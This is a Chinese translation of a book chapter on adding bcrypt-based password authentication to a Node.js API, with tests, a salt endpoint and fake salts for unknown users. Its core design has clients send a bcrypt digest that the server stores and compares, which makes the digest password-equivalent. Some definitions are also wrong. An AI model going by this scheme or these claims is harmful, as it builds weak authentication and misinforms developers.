# 安全性 – 身份验证和授权

到目前为止，在这本书中，我们已经开发了一个简单的 API，允许匿名用户创建、检索、修改和删除用户。这在实际应用中是不安全的，也是不实用的。因此，在本章中，我们将通过在 API 上实施基本的**身份验证**和**授权**层来开始保护我们的 API。这还将给我们一个机会来练习 TDD 过程并与 CI 服务器一起工作。

本章的目的是向您展示如何使用**JSON Web Tokens**（JWT）实现一个**无状态**的身份验证和授权方案。无状态对于确保我们应用程序的可扩展性至关重要，这一点我们将在第十八章“使用 Kubernetes 的强大基础设施”中讨论。

到本章结束时，我们的 API 将比当前状态更**安全**，但为了真正确保其安全性，我们还需要采取更多步骤。不可能涵盖所有安全相关主题，因此我们将专注于基础知识，并在本章末尾为您提供进一步实施安全措施的指南。

通过完成本章，您将：

+   理解**编码**、**哈希**、**加盐**、**加密**、**块加密**和其他加密技术

+   使用 JSON Web Tokens (JWT)理解和实现**基于密码的身份验证**

+   使用 JSON Web Tokens (JWT)理解和实现**基于令牌的身份验证**

+   实施授权检查以确保用户只能执行我们允许的操作

# 什么是身份验证？

*身份验证*是用户识别自己的方式，例如，通过用户名和密码的组合。一旦服务器能够确定用户的身份（用户已进行身份验证），服务器就可以授予该用户有限的权限以执行某些操作。这种授予权限的过程被称为**授权**：

![图片](img/3f6e2895-e10a-4317-b0bc-07627daa60f9.jpg)

例如，我们可能允许匿名用户创建新的用户账户，但不允许他们更新现有用户。对于已认证的用户，我们可能允许他们更新自己的用户资料，但不允许更新其他用户的资料；如果用户尝试编辑其他人的资料，他们将收到错误。

# 基于密码的身份验证简介

当客户端发送创建新用户的请求时，我们的服务器已经要求他们提供电子邮件和密码。因此，我们实现身份验证层的最简单方法就是使用用户的密码。

在最简单的方案中，用户必须在与每个请求一起发送他们的电子邮件和密码。在收到请求后，我们的 API 服务器可以将其与存储在我们数据库中的凭证进行比较；如果匹配，则用户已进行身份验证，否则没有。

虽然上述过程允许我们验证用户身份，但它并不一定安全，以下是一些原因：

+   密码以明文形式保存。根据英国通信管理局（Ofcom）[ofcom.org.uk/about-ofcom/latest/media/media-releases/2013/uk-adults-taking-online-password-security-risks](https://www.ofcom.org.uk/about-ofcom/latest/media/media-releases/2013/uk-adults-taking-online-password-security-risks)的报告，超过一半的互联网用户在多个网站上重复使用他们的密码。因此，任何拥有用户在一个平台上的明文密码的人可能都能访问用户在其他平台上的账户，例如社交媒体和银行账户。因此，将密码保留为明文意味着以下情况：

    +   客户端必须信任我们的 API 服务器不会对密码进行任何错误操作

    +   如果服务器和/或数据库曾经被入侵，黑客将能够读取明文密码

    +   恶意第三方可能会通过**中间人攻击**（**MITM**）窃听客户端与服务器之间的通信，并能够提取用户的明文密码

+   密码可以被**暴力破解**：恶意方可以尝试常见的密码，甚至尝试所有可能的字符组合，直到成功为止。

因此，我们应该强制执行强密码以防止暴力攻击，并在通过网络发送密码之前对其进行**加密哈希**。

# 哈希密码

一般而言，**哈希函数**将任意大小的数据（称为**消息**或**初始化向量**）映射到固定大小的数据（称为**摘要**）：

```js
const digest = MD5(message);
```

在安全环境中使用时，哈希算法用于混淆信息的一部分，例如密码。

例如，如果我们使用哈希函数**MD5**对密码短语`healer cam kebab poppy`和`peppermint green matcha ceylon`进行哈希，它将产生哈希摘要`b9f624315c5fb5dca09aa194091fccff`和`e6d4da56a185ff78721ab5cf07790a2c`。这两个摘要都具有固定的 128 位大小（以十六进制表示），并且看起来都很随机。MD5 算法还具有**确定性**的特性，这意味着如果我们再次使用相同的信息运行该算法，它将始终产生相同的摘要。

因此，从理论上讲，当用户首次注册时，我们可以要求客户端在将其发送到服务器之前对密码进行哈希处理；这样，除了客户端之外，没有人会知道原始密码是什么。然后服务器将在数据库中存储摘要。

下次同一用户希望与服务器进行身份验证时，他们应该再次散列密码并将摘要发送到服务器。因为 MD5 是确定性的，相同的密码应该产生相同的摘要。这使得服务器可以将请求中提供的摘要与数据库中存储的摘要进行比较；如果它们匹配，服务器就可以验证用户，*而无需知道密码的实际内容*。

# 加密散列函数

然而，MD5 不是一个适合散列密码的算法，因为尽管摘要看起来像是乱码，但现在有工具可以使用摘要来逆向工程密码。为了散列密码，我们需要使用一类特殊的散列函数，称为**加密散列函数**，它们具有以下特殊属性：

+   **确定性**: 给定相同的信息，它们将始终产生相同的摘要。

+   **单向性**: 消息或消息的一部分不能从摘要中逆向工程。从散列中获取原始消息的唯一方法是通过尝试消息的每个可能值来查看生成的散列是否匹配。

+   **显示雪崩效应**: 消息的微小变化会产生截然不同的摘要。这阻止了密码分析员在散列之间找到模式并缩小消息可能的组合。

+   **抗碰撞性**: 两个不同的消息应该产生两个不同的摘要。两个不同消息产生相同摘要的可能性极小。

+   **慢速**: 这可能看起来有些反直觉，但当散列用于安全时，一个较慢的算法会阻止暴力攻击。以下是一个例子：一个执行时间为 1 毫秒的散列函数可以在 11.5 天内产生 10 亿个散列。一个执行时间为 40 毫秒的散列函数可以在 463 天内产生 10 亿个散列，这是一个显著更长的时间。然而，对于一个普通用户来说，1 毫秒和 40 毫秒之间的差异是可以忽略不计的。换句话说，我们希望我们的算法对攻击者来说很慢，但对合法用户来说不是。

+   **鲁棒性**: 它必须经得起时间的考验。

# 选择一个加密散列算法

由于 MD5 违反了一致性约束，我们必须选择一个更合适的加密散列函数。有大量的散列算法可供选择。以下是一些最受欢迎的算法列表：**MD4**、**MD5**、**MD6**、**SHA1**、**SHA2**系列（包括**SHA256**、**SHA512**）、**SHA3**系列（包括**SHA3-512**、**SHAKE256**）、**RIPEMD**、**HAVAL**、**BLAKE2**、**RipeMD**、**WHIRLPOOL**、**Argon2**、**PBKDF2**和**bcrypt**。

MD5 和 SHA-1 在它们被引入时非常受欢迎，当时被视为鲁棒的加密散列算法，但后来被更现代的加密散列函数如 PBKDF2 和 bcrypt 所取代。

算法可能由于以下因素变得不合适：

+   **可以人为制造碰撞**：碰撞是不可避免的，如果给定足够的时间和资源，原始消息可以从哈希值中暴力破解出来。

    然而，如果有人能够**故意**设计两条不同的消息以产生相同的哈希值，这意味着他们可能在不了解密码的情况下验证另一个用户。这通常需要大量的计算能力和时间。

    因此，如果一个算法生成碰撞需要超乎寻常的时间/资源，那么可以假设该算法具有抗碰撞性，因为这样他们可能获得的信息不值得他们投入的时间和资源去获取。

    然而，由于密码学在安全中扮演着如此基础的角色，因此密码学哈希算法在学术界受到了严格的审查。通常，研究人员会故意尝试在算法中生成碰撞（MD5 和 SHA-1 都是通过这种方式被推翻的）。

+   **处理速度的进步**：加密算法旨在慢速。如果处理器的速度增加，这意味着恶意方可以花费更少的时间/资源来破解密码。最终，处理速度的进步可能会使算法变得不适用。

    为了减轻碰撞，算法应该足够复杂且难以逆向工程。它还应该生成足够长的摘要以降低碰撞的概率（对于 1024 位的摘要来说，生成碰撞比 128 位的摘要要困难得多）。

    为了减轻处理速度的进步，现代算法采用了一种称为**哈希拉伸**（例如**密钥拉伸**）的方法，这允许算法动态地改变算法的速度。

# 哈希拉伸

哈希拉伸通过多次重复加密哈希函数来减慢算法的速度。例如，我们不是用 SHA-256 对密码进行一次哈希，而是反复对生成的哈希值运行 SHA-256：

```js
function simpleHash(password) {
  return SHA256(password);
}

function repeatedHash(password) {
  const iterations = 64000;
  let x = 0;
  let hash = password;
  while (x < iterations) {
    hash = SHA256(hash);
    x++;
  }
  return hash;
}
```

这种方法的优点是你可以通过改变迭代次数来改变函数运行所需的时间。例如，如果过去几年计算能力翻倍了，你只需简单地加倍迭代次数以保持相同的安全级别。

# 哈希拉伸算法

有三种现代算法利用哈希拉伸：**基于密码的密钥派生函数 2**（**PBKDF2**）、**bcrypt**和**scrypt**。PBKDF2 和 bcrypt 之间的区别在于 bcrypt 在 GPU 上运行的成本比 PBKDF2 高，因此攻击者更难使用多个 GPU 并行化操作。

PBKDF2 和 bcrypt 都使用少量且恒定的内存，这使得它们容易受到使用**应用特定集成电路芯片**（**ASICs**）和/或**现场可编程门阵列**（**FPGA**）进行的暴力破解攻击的影响。scrypt 是为了解决这个问题而发明的，它允许你调整计算散列所需的 RAM 量。然而，scrypt 仅在 2009 年发布，并且不像其他两种算法那样经过充分的实战测试。

因此，在这本书中，我们将使用 bcrypt 算法，因为它自 1999 年以来一直存在，并且尚未发现任何漏洞。

# 防御针对单个用户的暴力破解攻击

在我们对密码进行散列以混淆它时，恶意方仍然可能通过以下方式获取目标受害者的密码：

+   **字典攻击**：利用许多用户使用常见密码（如`qwertyuiop`）的事实。在字典攻击中，恶意方会使用程序尝试成千上万的最可能密码，希望其中之一能够成功。

+   **暴力破解攻击**：这与字典攻击类似，但程序会遍历定义范围内的所有可能消息（例如，所有长度小于 13 个字符的小写字母字符串，从`a`、`b`...`aa`、`ab`、`ac`开始，一直到最后`zzzzzzzzzzzzz`）。

即使我们的密码已经散列，恶意方也可以预先生成一个预散列条目表（也称为**查找表**或**彩虹表**），并尝试使用散列而不是明文密码进行身份验证；其基本原理是相同的。

此外，如果恶意方能够获取用户的密码散列（例如，通过监听通信），它可以在查找表中搜索相同的散列，并能够从查找表中确定原始密码。

# 防御暴力破解攻击

幸运的是，我们可以采用一个非常简单的机制来减轻查找表/彩虹表攻击，那就是使密码非常长。

可能的散列数量随着以下因素呈指数级增长：

1.  密码的长度

1.  密码中每个字符可能的字符范围

假设我们的密码可以包含小写字母、大写字母和数字；这为我们每个字符提供了 62 种独特的可能性。如果我们有一个字符的密码，这意味着我们只需要生成一个包含 62（62¹）个条目的彩虹表，就可以保证找到匹配项。如果我们有一个最多两个字符的密码，现在有 3,906（62¹ + 62²）种可能的组合。如果我们允许密码最长为 10 个字符，那么就有 853,058,371,866,181,866，或 853 万亿种组合（62¹ + 62² + 62³ + 62⁴ + 62⁵ + 62⁶ + 62⁷ + 62⁸ + 62⁹ + 62¹⁰）。虽然这听起来像是一个难以想象的大数字，但有些机器每秒可以计算数百亿个哈希值。因此，要遍历所有这些组合大约需要一个月——仍然不是很安全。

然而，如果密码的最大长度变为 20 个字符，那么将需要 715,971,350,555,965,203,672,729,121,413,359,850，或 715 decillion，次迭代来生成所有 20 个字符的密码。这额外的 10 个字符意味着现在生成所有密码组合要难 839 quadrillion 倍。

因此，通过实施合理的密码策略，可以阻止黑客尝试暴力破解攻击。一个合理的策略可能如下所示：

+   密码长度必须至少为 12 个字符

+   密码必须包含至少一个特殊字符（`!£$^&()+-=[]}{:@;<>.,`）

使用我们的 21 个特殊字符列表，我们的字符范围现在增加到 83。因此，黑客必须计算 10,819,354,441,840,089,422,004,000，或 108 sextillion，个哈希值，才能保证密码匹配。

或者，你可以鼓励用户使用一个**口令短语**，即几个无关的单词连在一起；例如，`correct horse battery staple`（这是对 XKCD 漫画的引用：[xkcd.com/936](https://xkcd.com/936/)）。这确保了密码足够长，以至于字符范围不足的问题不再重要。攻击者必须尝试大量的组合，才能到达你的口令短语。

# 反向查找表攻击

在将密码在客户端哈希之前进行哈希处理并强制执行强大的密码策略可以防止针对单个用户的暴力破解攻击。然而，如果恶意方能够获取用户数据库的大部分，他们可以执行另一种称为**反向查找表攻击**的攻击。

在这种攻击方法中，恶意方会搜索受损害的数据库，寻找已知原始消息的摘要，以获取使用该摘要的用户账户列表，从而获得相同的密码。

# 防御反向查找表攻击

幸运的是，我们可以在对用户密码进行哈希处理之前，在密码的开始或末尾附加一个长的高熵随机字符串，从而轻松防止反向查找表攻击。这个随机字符串被称为**盐**，可以是公开的。

这就是它的工作原理：在客户端，不是只散列密码，客户端首先会生成一个随机盐（例如，使用`crypto`包），然后将密码和盐的连接字符串进行散列：

```js
const salt = crypto.randomBytes(128).toString('base64');
const saltedPasswordDigest = MD5(password + salt);
```

然后，客户端会将加盐密码的散列值以及盐发送到服务器。服务器随后会将散列值和盐都存储在用户文档中。

下次用户想要登录时，他们首先会将他们的用户 ID/用户名提交给服务器。服务器会找到与该用户关联的盐，并将其发送回客户端。接下来，客户端会用盐对密码进行散列，并将散列值发送回服务器。然后，服务器会将请求中的散列值与数据库中的散列值进行比较；如果匹配，就会验证用户的身份。

盐的作用是使可能常见的密码变得不常见。因此，即使两个用户有相同的密码，最终的密码散列值也会不同。因此，即使攻击者已经将密码解密为散列值，他们也无法使用查找表来识别使用相同密码的其他用户，因为他们的密码散列值是不同的。

盐越长，密码和盐的组合就越不常见。16 个字符的字符串可能就足够了，但由于在这个规模上的数据存储和带宽都很便宜，所以过度使用也不是什么坏事。因此，我们建议使用 256 位的盐，这意味着 32 个字符的盐。

盐并不是需要保密的东西。如果攻击者想要针对特定账户，他们可以轻松地获取该用户的盐。但是，由于每个盐都不同，攻击者需要为每个唯一的盐生成一个新的彩虹表。而且如果用户一开始就有相对较长的密码，这就不切实际了。（想象一下，如果用户的密码是 10 个字符，那么仅破解一个用户账户就需要数百亿次的计算。）因此，加盐使得查找和反向查找表无效，因为攻击者实际上无法预先计算所有盐的散列值列表。

# 实现基于密码的认证

在掌握了散列和加盐的知识后，我们现在将使用 bcrypt 算法在我们的现有 API 上实现基于密码的认证层。首先，我们需要更新我们的`Create User`端点，使其接受 bcrypt 散列值而不是密码。由于我们遵循 TDD，我们将首先更新端到端测试，然后再更新实现。

# 更新现有的端到端测试

首先，在 Gherkin 规范和 Cucumber 代码中，更新所有与密码相关的部分以使用散列值；这包括步骤描述、步骤定义和示例数据。例如，你可以在`Create User`功能的“Bad Client Requests”场景的端到端测试中进行以下更改：

```js
--- a/spec/cucumber/features/users/create/main.feature
+++ b/spec/cucumber/features/users/create/main.feature
@@ -34,9 +34,9 @@ Feature: Create User

     Examples:

- | missingFields | message                          |
- | email         | The '.email' field is missing    |
- | password      | The '.password' field is missing |
+ | missingFields | message                        |
+ | email         | The '.email' field is missing  |
+ | digest        | The '.digest' field is missing |
```

尝试在 `spec/cucumber` 目录中进行全局搜索，将单词 `password` 替换为 `digest`。

要生成一个虚拟的 bcrypt 摘要，尝试在网上搜索在线 bcrypt 生成器；有许多免费的在线工具可用。

# 生成随机摘要

在我们的代码包中，有一个 `createUser` 函数，我们用它来为测试生成虚拟用户。目前，它正在使用 `crypto.randomBytes()` 方法生成一个随机的 32 位十六进制字符串作为密码。要从这个密码生成摘要，我们可以使用来自 [npmjs.com](https://npmjs.com) 注册表的包。

# 选择 bcrypt 库

有几个 bcrypt 库可供 JavaScript 使用：

+   `bcrypt` (`node.bcrypt.js`)：这是 bcrypt 算法最性能和最有效的实现，因为它使用了 C++ 实现，并将其简单地绑定到 Node 上。然而，它有许多依赖和限制，使得使用起来很复杂，特别是：

    +   Python 2.x。

    +   `node-gyp`：因为 `bcrypt` 是作为一个 Node.js 插件编写的，它是用 C++ 编写的，在可以使用之前必须为你的机器架构编译。这意味着它必须依赖于 `node-gyp` 进行构建和安装过程。`node-gyp` 只与 Node 的长期支持（LTS）版本一起工作。

+   `bcryptjs` ([npmjs.com/package/bcryptjs](https://www.npmjs.com/package/bcryptjs))：bcrypt 的独立 JavaScript 实现，没有外部依赖。因为它不是在像 C++ 这样的底层语言上运行，所以它稍微慢一些（30%）。这意味着它每单位时间内无法像更有效的实现那样处理那么多迭代。它具有与 `bcrypt` 包相同的接口，也可以在浏览器中运行，其中它依赖于标准化的 Web Crypto API 生成随机数。

+   `bcrypt-nodejs`：`bcryptjs` 的一个未维护的先行者。

因此，选择是在性能（`bcrypt`）和设置简便（`bcryptjs`）之间。

不要感到困惑。加密散列算法应该是慢的；它越慢，就越安全。然而，你应该始终假设攻击者会使用该算法可能的最快实现，因此我们应在可能的情况下也使用最快的实现。因此，纯粹从安全角度考虑，`bcrypt` 包比 `bcryptjs` 更受欢迎，因为它是 JavaScript 的最快实现。

我们现在将使用 `bcryptjs` 包，因为它设置起来最简单。但当你完成这本书中的所有练习后，你可以自由地切换到使用 `bcrypt` 包以获得额外的性能提升。由于 `bcryptjs` 包与 `bcrypt` 包 100% 兼容，你只需要更新 `import` 语句；其他所有内容都可以保持不变。

# 使用 bcryptjs 库

首先，让我们将其作为开发依赖项安装：

```js
$ yarn add bcryptjs --dev
```

然后，从`bcryptjs`模块导入`genSaltSync`和`hashSync`方法，并使用它们生成盐和摘要。我们还将盐和摘要存储在上下文中，以帮助我们进行后续步骤的断言：

```js
import { genSaltSync, hashSync } from 'bcryptjs';
...
async function createUser() {
  ...
  user.password = crypto.randomBytes(32).toString('hex');
 user.salt = genSaltSync(10);
 user.digest = hashSync(user.password, user.salt);
  const result = await client.index({ index, type, refresh, 
    body: {
      email: user.email,
      digest: user.digest,
    },
  });
  ...
}
```

通常，我们会使用 hash 方法的异步版本。然而，由于我们正在编写测试，而这个步骤无论如何都无法继续，除非这一步已经完成执行，因此我们可以使用同步方法来节省一行返回承诺的代码。

`genSaltSync`函数具有以下函数签名：

```js
genSaltSync([rounds, seed_length])
```

在这里，`rounds`决定了 bcrypt 应该执行多少轮哈希拉伸；数字越高，摘要生成和验证的速度越慢。默认值是`10`，这是我们在这里使用的。

如果我们现在运行测试，单元和集成测试应该仍然通过，但端到端测试将失败。

# 验证摘要

接下来，我们需要指定一个新的场景概述，以断言带有无效`digest`有效负载属性的`POST /users`请求应收到`400 Bad Request`响应。你的场景概述可能看起来像这样：

```js
Scenario Outline: Request Payload with invalid digest format
  When the client creates a POST request to /users
  And attaches a Create User payload where the digest field is exactly <digest>
  And sends the request
  Then our API should respond with a 400 HTTP status code
  And the payload of the response should be a JSON object
  And contains a message property which says "The '.digest' field should be a valid bcrypt digest"

  Examples:

  | digest                                                       |
  | jwnY3Iq1bpT5RTsAXKOLnr3ee423zWFU23efwXF27bVKJ4VrDmWA0hZi6YI0 |
  | $2y$10$a7iPlM2ORVOPr0QNvDf.a.0QKEWwSGRKBaKSqv,40KFGcBuveazjW |
  | #2y$10$a7iPlM2ORVOPr0QNvDf.a.0QKEWwSGRKBaKSqv.40KFGcBuveazjW |
```

# 更新现有实现

现在我们已经更新了现有的测试，是时候更新我们的实现以使测试再次通过。让我们从更新创建用户 JSON 模式开始，将`password`属性替换为`digest`属性：

```js
{
  "properties": {
    "email": { ... },
    "digest": { "type": "string" },
    "profile": { ... }
  },
  "required": ["email", "digest"],
}
```

然而，仅仅验证`digest`属性的 数据类型是不够的；我们需要检查`digest`字符串是否是合法的 bcrypt 摘要。幸运的是，所有 bcrypt 摘要都有相同的一般结构：

![图片](img/c0ee0f6d-25b5-4736-93b2-458a37c59deb.jpg)

因此，我们可以使用以下正则表达式来匹配有效的摘要：

```js
^\$2[aby]?\$\d{1,2}\$[.\/A-Za-z0-9]{53}$
```

为了解释这个正则表达式，让我们将其分解：

+   `\$2[aby]?\$`：这匹配使用的算法。有效值是`2`、`2a`、`2y`和`2b`。

+   `\d{1,2}\$`：这匹配成本或轮数，是一个介于 4 到 31（包含）之间的整数。

+   `[.\/A-Za-z0-9]{53}`：这匹配盐和哈希，盐占前 22 个字符，哈希密码占后 31 个字符。

因此，让我们更新我们的摘要子模式以包括此模式：

```js
"digest": {
  "type": "string",
  "pattern": "^\\$2[aby]?\\$\\d{1,2}\\$[.\\/A-Za-z0-9]{53}$"
}
```

我们在模式中使用的模式包含额外的反斜杠来转义正则表达式中的反斜杠。

现在，如果客户端提供的密码摘要不匹配此模式，创建用户验证器将返回一个`ValidationError`对象，其中`keyword`属性设置为`"pattern"`。我们可以利用这个事实来返回一个自定义消息，通知客户端提供的摘要无效。

将以下行添加到`src/validators/errors/messages/index.js`：

```js
if (error.keyword === 'pattern') {
  return `The '${pathPrefix}${error.dataPath}' field should be a valid bcrypt digest`;
}
```

最后，别忘了编写覆盖这个新逻辑分支的单元测试：

```js
it('should return the correct string when error.keyword is "pattern"', function () {
  const errors = [{
    keyword: 'pattern',
    dataPath: '.test.path',
  }];
  const actualErrorMessage = generateValidationErrorMessage(errors);
  const expectedErrorMessage = "The '.test.path' field should be a valid bcrypt digest";
  assert.equal(actualErrorMessage, expectedErrorMessage);
});
```

然后，在我们的检索用户和搜索用户引擎（定义在`src/engines/users/`中），确保我们在查询用户对象时排除了`digest`字段，例如：

```js
db.get({
  index: process.env.ELASTICSEARCH_INDEX,
  type: 'user',
  id: req.params.userId,
  _sourceExclude: 'digest',
})
```

现在，再次运行端到端测试并确认它们通过。完成之后，更新单元和集成测试，以确保它们也能通过。最后，将更改提交到一个名为 `authentication/main` 的新分支，将该分支推送到 GitHub，并在 Travis 和 Jenkins CI 服务器上检查结果。

# 获取盐

更新后的创建用户端点现在要求用户以 bcrypt 摘要的形式指定其凭据，我们将它存储在我们的 Elasticsearch 数据库中。接下来，我们需要实现一个系统，我们可以通过比较客户端提供的摘要和我们存储在数据库中的摘要来验证任何后续请求。

但是，为了使客户端能够重新生成相同的摘要，它们必须提供相同的盐和参数。因此，我们的 API 需要为客户端创建一个新的端点来获取盐。

就像其他功能一样，我们通过编写端到端测试来开始我们的开发。在 `spec/cucumber/features/auth/salt/main.feature` 中创建一个新的功能规范，并添加以下场景：

```js
Feature: Retrieve Salt and Parameters

  Test that we can create a user using a digest and then retrieve information about the digest's salt and parameters successfully

  Scenario: Retrieve Salt without specifying Email

    When the client creates a GET request to /salt
    And sends the request
    Then our API should respond with a 400 HTTP status code
    And the payload of the response should be a JSON object
    And contains a message property which says "The email field must be specified"

  Scenario: Send Digest and Retrieve Salt

    Given a new user is created with random password and email
    When the client creates a GET request to /salt
    And set a valid Retrieve Salt query string
    And sends the request
    Then our API should respond with a 200 HTTP status code
    And the payload of the response should be a string
    And the payload should be equal to context.salt
```

使用你所学的知识来实现未定义的步骤。

# 实现获取盐端点

我们应该保持获取盐端点的实现与现有的端点一致，因此我们应该为它创建一个处理程序和引擎。

# 实现获取盐引擎

在 `src/engines/auth/salt/retrieve/index.js` 中创建一个新的获取盐引擎。在其中，我们需要使用 Elasticsearch 客户端的 `search` 方法通过电子邮件找到用户的文档，从文档中提取摘要，然后从摘要中提取盐：

```js
const NO_RESULTS_ERROR_MESSAGE = 'no-results';

function retrieveSalt(req, db, getSalt) {
  if (!req.query.email) {
    return Promise.reject(new Error('Email not specified'));
  }
  return db.search({
    index: process.env.ELASTICSEARCH_INDEX,
    type: 'user',
    body: {
      query: {
        match: {
          email: req.query.email,
        },
      },
    },
    _sourceInclude: 'digest',
  }).then((res) => {
    const user = res.hits.hits[0];
    return user
      ? user._source.digest
      : Promise.reject(new Error(NO_RESULTS_ERROR_MESSAGE));
  }).then(getSalt);
}

export default retrieveSalt;

```

此函数需要 `bcrypt` 库中的 `getSalt` 方法，该方法将由处理程序函数注入。接下来，在 `src/handlers/auth/get-salt/index.js` 中创建一个文件来存放处理程序函数，该函数简单地将请求传递给引擎，并根据引擎的结果生成标准响应：

```js
function retrieveSalt(req, res, db, engine, _validator, getSalt) {
  return engine(req, db, getSalt).then((result) => {
    res.status(200);
    res.set('Content-Type', 'text/plain');
    return res.send(result);
  }, (err) => {
    if (err.message === 'Email not specified') {
      res.status(400);
      res.set('Content-Type', 'application/json');
      return res.json({ message: 'The email field must be specified' });
    }
    throw err;
  }).catch(() => {
    res.status(500);
    res.set('Content-Type', 'application/json');
    return res.json({ message: 'Internal Server Error' });
  });
}

export default retrieveSalt;
```

最后，在 `src/index.js` 中导入引擎和处理程序，并使用它创建一个新的端点：

```js
import { getSalt } from 'bcryptjs';
import retrieveSaltHandler from './handlers/auth/salt/retrieve';
import retrieveSaltEngine from './engines/auth/salt/retrieve';
const handlerToEngineMap = new Map([
  [retrieveSaltHandler, retrieveSaltEngine],
  ...
]);
app.get('/salt', injectHandlerDependencies(retrieveSaltHandler, client, handlerToEngineMap, handlerToValidatorMap, getSalt));

```

由于我们现在在实现代码中使用 `bcryptjs` 包，而不仅仅是测试代码，我们应该将其从 `devDependencies` 移动到 `dependencies`：

```js
$ yarn remove bcryptjs
$ yarn add bcryptjs
```

最后，我们还应该修改 `injectHandlerDependencies` 函数以传递 `getSalt` 依赖项：

```js
function injectHandlerDependencies(
  handler, db, handlerToEngineMap, handlerToValidatorMap, ...remainingArguments
) {
  const engine = handlerToEngineMap.get(handler);
  const validator = handlerToValidatorMap.get(handler);
  return (req, res) => { handler(req, res, db, engine, validator, ...remainingArguments); };
}

export default injectHandlerDependencies;
```

现在，当我们运行端到端测试时，它们应该全部通过。

# 为不存在的用户生成盐

然而，当客户端尝试获取不存在用户的盐时会发生什么？目前，由于我们没有处理 Elasticsearch 返回零搜索结果的情况，我们的 API 将响应 `500 内部服务器错误`。但我们的 API 应该如何响应呢？

如果我们响应一个`404 Not Found`错误，那么任何拥有 API 测试工具（如 Postman）的人都能确定是否有用户在我们的平台上注册了该电子邮件。想象一下，如果我们的平台不是一个公开的用户目录，而是一个提供如整形手术中心、生育诊所或律师事务所等个人/医疗服务客户的门户；如果有人仅通过输入电子邮件就能发现他/她已注册该服务，而没有收到“用户未找到”的消息，这对客户来说将是尴尬的。

无论后果是否可能令人尴尬，通常都是一个好习惯，即尽可能少地暴露信息。这是最小权限原则的扩展，即系统应仅向实体暴露执行其功能所需的最小信息量。

因此，返回一个`404 Not Found`错误是不合适的。

那么，替代方案是什么？由于我们所有的 bcrypt 盐都有相同的长度（序列`$2a$10$`后跟 22 个字符）和有效的字符范围，我们可以简单地使用`bcrypt.genSaltSync()`生成一个新的盐，并将其作为盐返回。例如，我们可以在`getSalt`引擎模块的末尾定义以下捕获块：

```js
.catch(err => {
  if (err.status === 404) {
    return bcrypt.genSaltSync(10);
  }
  return Promise.reject(new Error('Internal Server Error'));
});
```

然而，试图利用我们的 API 的人可以发送多个请求，观察返回的每个盐都是不同的，并推断出这不是一个真实用户（因为用户在短时间内很可能有相同的盐）。所以，即使为不存在的用户生成新的随机字符串会减缓这种攻击者的速度，但我们的 API 仍然会泄露太多信息。

相反，我们可以使用一个**伪随机数生成器**（一个**PRNG**，它是一种**确定性随机比特生成器**（**DRBG**））。PRNG 生成一个看似随机的数字序列，但实际上是基于一个初始值（称为**种子**）确定的。因此，我们可以使用用户的电子邮件地址作为种子，并使用它来生成一个看似随机的数字序列，将其转换成一个 22 个字符的字符串，在序列前面加上`$2a$10$`，并将其作为该用户的盐值发送回客户端。这样，无论用户是否存在，都会返回一个持久不变的盐。

# 编写端到端测试

所以，首先，让我们编写一个新的场景，这个场景将测试两个事情：

+   当查询不存在用户的盐（通过电子邮件标识）时，它将返回具有正确字符数和字符范围的字符串

+   当在多个请求中查询同一不存在用户的盐时，返回的盐应该是相同的

你的功能文件可能看起来像这样：

```js
Scenario: Retrieve Salt of Non-Existent User

 When the client creates a GET request to /salt
 And set "email=non@existent.email" as a query parameter
 And sends the request
 Then our API should respond with a 200 HTTP status code
 And the payload of the response should be a string
 And the response string should satisfy the regular expression /^\$2a\$10\$[a-zA-Z0-9\.\/]{22}$/

Scenario: Retrieve the same Salt of Non-Existent User over multiple requests

 Given the client creates a GET request to /salt
 And set "email=non@existent.email" as a query parameter
 And sends the request
 And the payload of the response should be a string
 And saves the response text in the context under salt

 When the client creates a GET request to /salt
 And set "email=non@existent.email" as a query parameter
 And sends the request
 And the payload of the response should be a string
 And the payload should be equal to context.salt
```

你还需要定义以下步骤定义：

```js
Then(/^the response string should satisfy the regular expression (.+)$/, function (regex) {
 const re = new RegExp(regex.trim().replace(/^\/|\/$/g, ''));
 assert.equal(re.test(this.responsePayload), true);
});
```

运行测试并观察它们失败。一旦你做到了这一点，我们就准备好实现这个功能了。

# 实现

JavaScript 的`Math.random()`没有提供提供种子的选项，但有一些库实现了 JavaScript 中的伪随机数生成器。其中两个最受欢迎的是`seedrandom`和`random-seed`。在这两个中，`random-seed`包提供了一个`string(count)`方法，可以生成一个随机字符串而不是随机数；由于这种便利性，我们将使用`random-seed`包来生成我们的假盐。

首先，让我们安装它：

```js
$ yarn add random-seed
```

现在，在`utils/generate-fake-salt.js`中创建一个新文件，并定义一个新的`generateFakeSalt`函数，该函数将根据用户的电子邮件输出一个假盐：

```js
import randomseed from 'random-seed';

function generateFakeSalt(seed) {
  const salt = randomseed

    // Seed the pseudo-random number generator with a seed so the 
    // output is deterministic
    .create(seed)

    // Instead of a number, generate a string of sufficient length,
    // so that even when invalid characters are stripped out,
    // there will be enough characters to compose the salt
    .string(110)

    // Replace all characters outside the character range of a valid    
    //bcrypt salt
    .replace(/[^a-zA-Z0-9./]/g, '')

    // Extract only the first 22 characters for the salt
    .slice(0, 22);

  // Prepend the bcrypt algorithm version and cost parameters
  return `$2a$10$${salt}`;
}

export default generateFakeSalt;
```

接下来，在`retrieveSalt`引擎中，在末尾添加一个`catch`块，如果找不到用户，将使用`generateFakeSalt`函数：

```js
function retrieveSalt(req, db, getSalt, generateFakeSalt) {
  ...
    .then(bcrypt.getSalt)
    .catch((err) => {
 if (err.message === NO_RESULTS_ERROR_MESSAGE) {
 return generateFakeSalt(req.query.email);
 }
 return Promise.reject(new Error('Internal Server Error'));
 });
}
```

再次，在`src/index.js`中导入`generateFakeSalt`实用函数，并通过处理器将其传递给引擎。

现在，再次运行 E2E 测试套件，测试应该通过。添加一些单元和集成测试来覆盖这些新的代码块。完成之后，提交更改并继续下一步。

# 登录

客户现在可以执行以下操作：

+   在创建新用户时指定密码摘要

+   查询摘要盐

这意味着客户端现在可以使用相同的盐和密码组合来重新生成它在创建用户时提供的确切相同的哈希值。

这意味着当客户端想要执行需要授权的操作（例如更新其个人资料）时，它可以将其电子邮件和摘要发送到 API 服务器，我们的服务器将尝试将它们与数据库记录匹配；如果匹配成功，用户将被认证并且操作可以继续，否则，将返回错误响应。

虽然在每次请求中都全局执行此认证过程是可行的，但它有以下不理想的原因：

+   客户端必须将凭据本地存储。如果这样做不正确（例如，作为一个未标记为安全的 cookie），那么其他程序可能能够读取它。

+   服务器需要在每次请求时查询数据库，这是一个耗时的操作。此外，如果 API 正在接收大量流量，它可能会使数据库过载，从而成为性能瓶颈。

